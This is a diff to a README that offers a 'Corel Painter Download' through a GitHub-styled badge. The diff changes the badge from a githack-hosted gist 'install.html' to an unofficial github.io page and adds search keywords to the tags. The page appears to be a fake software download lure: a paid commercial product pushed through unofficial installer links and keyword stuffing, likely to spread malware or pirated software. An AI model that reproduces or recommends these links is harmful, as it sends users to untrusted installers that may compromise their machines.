@@ -1,6 +1,6 @@
 # Corel Painter Download — Desktop Graphics
 
-[![Get Corel Painter GitHub](https://img.shields.io/badge/Get%20Corel%20Painter%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/deserthaze100-dot/094a13b81363eb1e5c0eda26233e4ad8/raw/50b878742a4fdb7823399ad3efb1a425a5ad67e8/install.html?offer=CorelPainter)
+[![Get Corel Painter GitHub](https://img.shields.io/badge/Get%20Corel%20Painter%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CorelPainter)
 
 ---
 
@@ -77,7 +77,7 @@ A: Yes, you can create, import, and modify brushes and textures to match your wo
 
 ## 🔍 Tags
 
-Corel Painter, digital painting, desktop graphics, illustration software, cross-platform art, professional painting tools, creative desktop app, high-resolution art, painting app Windows Mac, creative desktop painting, Corel Painter pc, Corel Painter windows, Corel Painter desktop, Corel Painter for mac, Corel Painter for pc, Corel Painter for windows, Corel Painter mac
+Corel Painter, corel paint software, corel painter 2024, painter essentials, corel painter essentials, digital painting, desktop graphics, illustration software, cross-platform art, professional painting tools, creative desktop app, high-resolution art, painting app Windows Mac, creative desktop painting, Corel Painter pc, Corel Painter windows, Corel Painter desktop, Corel Painter for mac, Corel Painter for pc, Corel Painter for windows, Corel Painter mac
 
 ---
 
